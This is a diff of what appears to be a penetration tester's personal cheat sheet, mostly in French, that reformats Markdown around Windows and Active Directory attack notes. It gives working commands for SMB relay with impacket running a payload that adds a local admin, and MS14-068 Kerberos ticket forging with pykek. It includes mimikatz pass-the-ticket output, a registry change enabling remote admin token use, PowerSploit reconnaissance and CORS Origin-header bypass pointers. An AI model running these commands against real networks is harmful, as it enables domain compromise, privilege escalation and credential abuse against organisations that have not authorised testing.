@@ -4,12 +4,7 @@ Something to sort. one day…
 
 ## Which word is most used in books
 
-https://books.google.com/ngrams/graph?content=authorisation%2Cauthorization&year_start=1800&year_end=2008&corpus=15&smoothing=3&share=&direct_url=t1%3B%2Cauthorisation%3B%2Cc0%3B.t1%3B%2Cauthorization%3B%2Cc0
-
-
-
-
-
+<https://books.google.com/ngrams/graph?content=authorisation%2Cauthorization&year_start=1800&year_end=2008&corpus=15&smoothing=3&share=&direct_url=t1%3B%2Cauthorisation%3B%2Cc0%3B.t1%3B%2Cauthorization%3B%2Cc0>
 
 ## Lister les logiciels installés sur une machine
 
@@ -19,14 +14,10 @@ Cette commande PowerShell fait une requête WMI vers un PC distant pour lister l
 Les données retournées peuvent être filtrées à l'aide de `Select-Object` :
 `Get-WmiObject -Namespace "root\cimv2" -Class Win32_Product -Impersonation 3 -Credential 'domain.local\user' -ComputerName 192.168.1.1 | Select-Object -Property Name`
 
-
-
 ## Utiliser les modules PowerSploit, PowEnum, etc
 
 Pour autoriser le lancement de scripts non vérifiés :
 `Set-ExecutionPolicy Unrestricted`
-
-
 
 ## Utilisation de PowEnum
 
@@ -37,9 +28,7 @@ Au lieu d'importer le module à chaque fois, il est possible de mettre les fichi
 Découvrir le domaine
 `Invoke-PowEnum -Credential <domain>\<user> -FQDN <domain> -Mode Basic`
 
-Voir le readme du projet : https://github.com/whitehat-zero/PowEnum
-
-
+Voir le readme du projet : <https://github.com/whitehat-zero/PowEnum>
 
 ## PowerSploit
 
@@ -54,7 +43,7 @@ Comme je n'ai pas trouvé comment préciser un user différent pour exécuter le
 
 * pareil pour avoir le sid d'un user
 `Get-NetUser -UserName $UserName -Domain $Domain -DomainController $DomainController`
-Exemple : 
+Exemple :
 `Get-NetUser -UserName admuser -Domain domain.local -DomainController 192.168.1.1 | Select-Object -Property objectsid`
 
 ### Trouver le DN complet d'un user
@@ -62,7 +51,6 @@ Exemple :
 Comme au dessus, puis :
 
 `Get-NetUser -username $username -domain $FQDNdomain -domaincontroller $server | Select-Object -property distinguishedname`
-
 
 ## Exemples de SMBrelay
 
@@ -72,40 +60,35 @@ sudo /home/user/git/impacket/examples/smbrelayx.py -h 192.168.1.1 -e ./addadm-lo
 
 Il faut avoir préalablement compilé le binaire `addadm-local.exe` pour Windows. (TODO mettre cette partie de cross compilations)
 
-
-
 ## MS SQL - Requests for pentest
 
 Retrieve the exact version:
-```
+
+``` text
 select @@version
 ```
 
 List all database of the instance:
-```
+
+``` text
 SELECT name FROM master.sys.databases
 ```
 
 List all tables of the database:
-```
+
+``` text
 SELECT * FROM INFORMATION_SCHEMA.TABLES
     OR
 SELECT * FROM <databaseName>.INFORMATION_SCHEMA.TABLES
 ```
 
-
-
-
-
 ## not admin on Windows 10 ?
 
 If CME or Nessus confirm the local admin account is not able to be `Pwn3d!` (see cme), try this:
 
-```
+``` text
 reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 0x1
 ```
-
-
 
 ## lync / lyncsmash
 
@@ -118,12 +101,7 @@ si ça ne fonctionne pas parce que l'entrée en base64 est incorrecte, il est po
 Ensuite à partir du domaine, il est possible de trouver des noms intéressants :
 `./lyncsmash.py discover -H contoso.local`
 
-
-
-
-
 ## Utilisation de pykek
-
 
 * Création du ticket magique via ''pykek''
 `./ms14-068.py -u jdupond@domain.local -s S-1-5-21-1862828983-1608356927-24761 -d 192.168.1.1`
@@ -136,8 +114,7 @@ Ensuite à partir du domaine, il est possible de trouver des noms intéressants 
 
 * Profit!
 
-
-```
+``` text
 
 PS C:\Users\user\Downloads\PowerSploit\Recon> Get-NetUser -UserName jdupond -Domain domain.local -DomainController 192.168.1.1
 
@@ -196,9 +173,7 @@ S-1-5-21-1862828983-1608356927-24761
 
 ```
 
-
-
-```
+``` text
 PS C:\Users\user\Downloads\tgt> ..\mimikatz_trunk\x64\mimikatz.exe "kerberos::ptc TGT_jdupond@domain.local.ccache" exit
 
   .#####.   mimikatz 2.1.1 (x64) built on Dec 20 2017 00:18:01
@@ -321,20 +296,17 @@ mimikatz #
 
 ```
 
-
-
 ## Create a Firefox profile for web pentest
 
 ### disable background requests
 
-
-See: https://support.mozilla.org/en-US/kb/how-stop-firefox-making-automatic-connections
+See: <https://support.mozilla.org/en-US/kb/how-stop-firefox-making-automatic-connections>
 
 Tested on Firefox 63.0 (64 bits) for Linux
 
 In about:config:
 
-```
+``` text
 app.update.auto = false
 app.update.url = ''
 network.captive-portal-service.enabled = false
@@ -353,21 +325,14 @@ extensions.update.background.url = ''
 media.gmp-manager.url = ''
 ```
 
-
-
-
 ## CORS
-
 
 Toutes les infos que je trouve sur le CORS
 
 docs :
-* https://hackerone.com/reports/235200
 
+* <https://hackerone.com/reports/235200>
 
 Note : Lorsque la requête JavaScript est faite avec `XMLHttpRequest.withCredentials = true`, alors les "creds" (apparemment, les cookies) sont envoyés au serveur dans la requête. Mais le retour ne sera pas renvoyé au JavaScript par le navigateur si la réponse du serveur ne contient pas `Access-Control-Allow-Credentials: true`.
 
-
-Voir ici comment il est possible d'injecter son propre entête `Origin` pour by-passer une partie de la protection : https://medium.com/netscape/hacking-it-out-when-cors-wont-let-you-be-great-35f6206cc646
-
-
+Voir ici comment il est possible d'injecter son propre entête `Origin` pour by-passer une partie de la protection : <https://medium.com/netscape/hacking-it-out-when-cors-wont-let-you-be-great-35f6206cc646>
